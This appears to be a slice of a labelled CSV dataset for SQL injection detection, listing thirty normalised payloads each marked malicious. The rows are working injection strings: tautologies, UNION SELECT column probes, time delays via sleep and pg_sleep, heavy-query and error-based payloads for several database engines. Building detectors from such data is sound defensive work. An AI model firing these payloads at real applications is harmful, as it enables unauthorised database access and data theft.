row_index,payload_norm,label,sqli_type_hint
2640,"1"" ) ) as thoj where 1577 = 1577 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2641,1' where 9216 = 9216,1,
2642,"-4772 ) ) ) union all select 3879,3879,3879,3879,3879--",1,
2643,"select * from generate_series ( 5206,5206,case when ( 5206 = 2214 ) then 1 else 0 end ) limit 1--",1,
2644,"1' in boolean mode ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2645,"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""ouix"" = ""ouix",1,
2646,"1"" ) as giqb where 4664 = 4664",1,
2647,1' and 7528 = 2894 and 'qoyw' = 'qoyw,1,
2648,"1%"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""%"" = """,1,
2649,"select count ( * ) from generate_series ( 1,5000000 ) and 'roca' = 'roca",1,
2650,"-3362' where 6567 = 6567 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
2651,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1,
2652,"1"" and 9198 = 9198--",1,
2653,1 ) as azoo where 8933 = 8933 and ( 3020 = 3020 ) *6703--,1,
2654,1'|| ( select 'hbho' from dual where 7193 = 7193,1,
2655,1' ) ) ) rlike sleep ( 5 ) #,1,
2656,1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
2657,"-6007"" ) ) union all select 6019,6019,6019,6019,6019,6019,6019,6019--",1,
2658,"-9439"" ) where 9460 = 9460 or ( 9497 = 9586 ) *9586--",1,
2659,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'pemj' = 'pemj,1,
2660,"1%' ) ) union all select null,null,null,null,null,null,null,null,null--",1,
2661,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'agsi' = 'agsi",1,
2662,"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '%' = '",1,
2663,"1%' or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
2664,select ( case when ( 1946 = 1302 ) then 1946 else 1/ ( select 0 ) end ) --,1,
2665,( case when 6398 = 6398 then 1 else null end ),1,
2666,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,
2667,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) # ehsr",1,
2668,1' and 7533 = 7533 and 'frvk' = 'frvk,1,
2669,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1,
